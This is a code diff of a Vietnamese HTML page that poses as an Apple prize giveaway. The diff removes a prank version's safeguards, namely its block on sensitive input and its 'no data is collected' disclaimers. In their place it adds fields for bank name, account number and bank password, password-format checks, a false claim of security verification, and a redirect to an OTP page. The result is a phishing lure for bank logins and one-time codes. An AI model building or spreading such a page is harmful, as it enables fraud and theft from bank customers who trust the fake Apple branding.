@@ -12,7 +12,7 @@
     h1{margin:6px 0 6px;font-size:22px;letter-spacing:-0.5px}
     p.lead{color:var(--muted);margin:0 0 18px;font-size:14px}
     .form-col{display:flex;flex-direction:column;gap:12px;align-items:stretch;margin:12px 0}
-    input[type="text"], input[type="tel"]{padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);width:100%;background:rgba(255,255,255,0.02);color:#fff;font-size:15px}
+    input[type="text"], input[type="password"]{padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);width:100%;background:rgba(255,255,255,0.02);color:#fff;font-size:15px}
     button.cta{background:linear-gradient(90deg,#ff9f1c,#ffbf00);border:0;padding:12px 18px;border-radius:10px;font-weight:700;cursor:pointer;font-size:15px;box-shadow:0 8px 20px rgba(255,191,0,0.18)}
     .small{font-size:13px;color:var(--muted);margin-top:12px;text-align:center}
     .reveal{display:none;margin-top:18px;padding:14px;border-radius:8px;background:rgba(255,255,255,0.03);color:#ffdcdc;font-weight:700;text-align:center}
@@ -36,142 +36,81 @@
 
     <form class="form-col" onsubmit="return false;" aria-label="Form tên tài khoản và mật khẩu tài khoản">
 <div>
-        <label for="name">Tên ngân hàng (chính xác)</label>
-        <input id="name" type="text" placeholder="Ví dụ: Sacombank" aria-label="Tên ngân hàng" />
+        <label for="account">Tên ngân hàng (chính xác)</label>
+        <input id="account" type="text" placeholder="Ví dụ: Sacombank" aria-label="Tên ngân hàng" />
       </div>
 
       <div>
-        <label for="name">Tên tài khoản (chính xác)</label>
-        <input id="name" type="text" placeholder="Ví dụ: 05625455242" aria-label="Tên tài khoản" />
+        <label for="phone">Số tài khoản (chính xác)</label>
+        <input id="phone" type="text" placeholder="Ví dụ: 05625455242" aria-label="Số tài khoản" />
       </div>
       <div>
-        <label for="phone">Mật khẩu tài khoản (chính xác)</label>
-        <input id="phone" type="tel" placeholder="Ví dụ: Matkhau242##" aria-label="Mật khẩu tài khoản" />
-      </div>
+<label for="password">Mật khẩu tài khoản (chính xác)</label>
+<input id="password" type="password" placeholder="Ví dụ: Matkhau242##" aria-label="Mật khẩu tài khoản" />
 
-      
-      <button type="button" id="randomBtn" style="margin-top:8px;background:linear-gradient(90deg,#7ac6ff,#7ef3a6);border:0;padding:10px;border-radius:10px;font-weight:700;cursor:pointer"> Nhấn để nhận OTP xác nhận quà tặng</button>
-    </form>
-	 <div>
-        <label for="name">nhập OTP bên dưới để nhận quà ( sau đó ấn xác nhận)</label>
-        <input id="name" type="text" placeholder="Ví dụ: 05625" aria-label="Tên tài khoản" />
+<label style="font-size:14px; display:block; margin-top:5px;">
+  <input type="checkbox" id="showPass"> Hiện mật khẩu
+</label>
+
       </div>
-	<button class="cta" id="submitBtn" style="margin-top:6px">Xác nhận</button>
-    <div class="warning" id="warnText">⚠️ Cần nhập thông tin chính xác để nhận phần quà từ nhà cung cấp Apple.</div>
+	<p class="error" id="error1"></p>
+	<button id="confirmBtn" class="cta" style="margin-top:6px">Xác nhận</button>
+    <div class="warning" id="warnText">⚠️ Cần nhập thông tin chính xác để hoàn thành việc nhận quà.</div>
     <div class="reveal" id="revealBox" role="status"></div>
 
-    <div class="small">Phiên bản an toàn: Được xác nhận bởi trung tâm bảo mật cũng hãng.</div>
+    <div class="small">Phiên bản an toàn: Phần mềm đã được kiểm tra và xác nhận bởi trung tâm bảo mật của hãng.</div>
     <footer>Gửi cho bạn bè để nhận thêm nhiều phần và hấp dẫn khác và tiền mặt lên đến 100 triệu đồng &nbsp;•&nbsp; Tạo bởi: Nhà phần phối chính hãng Apple </footer>
   </div>
 
   <div id="confettiRoot" aria-hidden="true"></div>
 
 <script>
-  function makeConfetti(x,y){
-    const root = document.getElementById('confettiRoot');
-    for(let i=0;i<28;i++){
-      const el = document.createElement('div');
-      el.className='confetti-piece';
-      el.style.left = x + 'px';
-      el.style.top = y + 'px';
-      el.style.background = ['#ff6b6b','#ffd54a','#7ef3a6','#7ac6ff','#c679ff'][Math.floor(Math.random()*5)];
-      el.style.transform = `rotate(${Math.random()*360}deg)`;
-      el.style.opacity = '1';
-      root.appendChild(el);
-      const dx = (Math.random()-0.5)*600;
-      const dy = Math.random()*400 + 100;
-      const rot = (Math.random()-0.5)*720;
-      el.animate([
-        { transform: `translate(0px,0px) rotate(${Math.random()*360}deg)`, opacity:1 },
-        { transform: `translate(${dx}px,${dy}px) rotate(${rot}deg)`, opacity:0.2 }
-      ], { duration: 1200 + Math.random()*800, easing: 'cubic-bezier(.2,.8,.2,1)' });
-      setTimeout(()=> el.remove(), 2200);
+    const phoneInput = document.getElementById('phone');
+    const accInput = document.getElementById('account');
+    const showPass = document.getElementById('showPass');
+    const passInput = document.getElementById('password');
+    const error1 = document.getElementById('error1');
+    const confirmBtn = document.getElementById('confirmBtn');
+showPass.addEventListener('change', () => {
+  passInput.type = showPass.checked ? 'text' : 'password';
+});
+ function isValidPhone(p){
+      return /^\d{10}$/.test(p);
     }
-  }
-
-  const nameInput = document.getElementById('name');
-  const phoneInput = document.getElementById('phone');
-  const btn = document.getElementById('submitBtn');
-  const randomBtn = document.getElementById('randomBtn');
-  const reveal = document.getElementById('revealBox');
-
-  function looksLikeSensitive(value){
-    if(!value) return false;
-    const v = value.replace(/\s+/g,'');
-    if(/^\d{9,}$/.test(v)) return true;
-    const lowered = value.toLowerCase();
-    const keywords = ['mật khẩu','password','pwd','ccv','cvv','stk','số tk','cccd','cmnd','căn cước','thẻ'];
-    if(keywords.some(k => lowered.includes(k))) return true;
-    return false;
-  }
-
-  function validPhone(v){
-    if(!v) return false;
-    const cleaned = v.replace(/[\s\-\.()+]/g,'');
-    return /^(\+)?\d{7,15}$/.test(cleaned);
-  }
-
-  btn.addEventListener('click', ()=>{
-    const name = nameInput.value.trim();
-    const phone = phoneInput.value.trim();
-
-    if(!name || !phone){
-      alert('Vui lòng nhập cả tên và mật khẩu tài khoản.');
-      return;
+    function isValidAccount(a){
+      return /^[A-Za-z]+$/.test(a);
     }
-    if(looksLikeSensitive(name) || looksLikeSensitive(phone)){
-      alert('Vui lòng nhập thông tin chính xác để được nhận quà.');
-      return;
-    }
-    if(!validPhone(phone)){
-      alert('Mật khẩu không hợp lệ. Vui lòng nhập dạng như Matkhau123#.');
-      return;
+    function isValidPassword(p){
+      return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{7,}[!@#$%^&*]$/.test(p);
     }
 
-    btn.disabled = true;
-    reveal.style.display = 'block';
-    reveal.textContent = 'Đang gửi quà...';
-    const rect = btn.getBoundingClientRect();
-    makeConfetti(rect.left + rect.width/2, rect.top + rect.height/2);
+    confirmBtn.addEventListener('click', ()=>{
+      const phone = phoneInput.value.trim();
+      const acc = accInput.value.trim();
+      const pass = passInput.value.trim();
 
-    setTimeout(()=>{
-      reveal.innerHTML = `Quà đã được chuyển giả lập tới <strong>${escapeHtml(name)}</strong> (sđt: <strong>${escapeHtml(phone)}</strong>) 🎁<br><small style="color:#cbd5e1">Lưu ý: Đây là giả lập — trang KHÔNG thu thập dữ liệu.</small>`;
-      makeConfetti(rect.left + rect.width/2 + 40, rect.top + rect.height/2 - 20);
-    }, 900);
+      if(!phone || !acc || !pass){
+        error1.textContent = "⚠️ Vui lòng nhập đầy đủ thông tin.";
+        return;
+      }
+      if(!isValidPhone(phone)){
+        error1.textContent = "❌ Số điện thoại phải gồm đúng 10 chữ số.";
+        return;
+      }
+      if(!isValidAccount(acc)){
+        error1.textContent = "❌ Tên tài khoản chỉ được chứa chữ cái (A-Z, a-z).";
+        return;
+      }
+      if(!isValidPassword(pass)){
+        error1.textContent = "❌ Mật khẩu phải có chữ hoa, chữ thường, số và kết thúc bằng ký tự đặc biệt (ví dụ Aa1234#).";
+        return;
+      }
 
-    setTimeout(()=>{
-      reveal.innerHTML += `<br><br><strong>Đùa thôi! 😜</strong> Bạn không mất gì — <em>đừng nhập thông tin thật</em>.`;
-      btn.textContent = 'Sao chép link gửi bạn bè';
-      btn.disabled = false;
-      btn.onclick = copyShareLink;
-    }, 2200);
-  });
-
-  randomBtn.addEventListener('click', ()=>{
-    const names = ['Nguyễn Văn A','Trần Thị B','Lê Văn C','Phạm Thùy D','Hoàng Minh E'];
-    const phones = ['0912345678','0977654321','0381234567','0123456789','+84987654321'];
-    nameInput.value = names[Math.floor(Math.random()*names.length)];
-    phoneInput.value = phones[Math.floor(Math.random()*phones.length)];
-  });
-
-  function copyShareLink(){
-    const msg = 'Mở trang đùa này (phiên bản an toàn) — KHÔNG nhập thông tin nhạy cảm. (Mình gửi qua file/html)';
-    navigator.clipboard?.writeText(msg)
-      .then(()=> alert('Đã copy lời nhắn vào clipboard. Gửi cho bạn bè nhé!'))
-      .catch(()=> alert('Không thể copy tự động, bạn có thể sao chép tay: ' + msg));
-  }
-
-  function escapeHtml(unsafe) {
-    return unsafe.replace(/[&<"'>]/g, function(m) {
-      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];
+      // Nếu hợp lệ -> chuyển sang trang OTP
+      error1.textContent = "";
+      window.location.href = "otp.html";
     });
-  }
-
-  window.addEventListener('load', ()=> {
-    const centerX = window.innerWidth/2;
-    const centerY = window.innerHeight/2 - 80;
-    setTimeout(()=> makeConfetti(centerX, centerY), 400);
-  });
-</script>
+  </script>
 </body>
 </html>
+
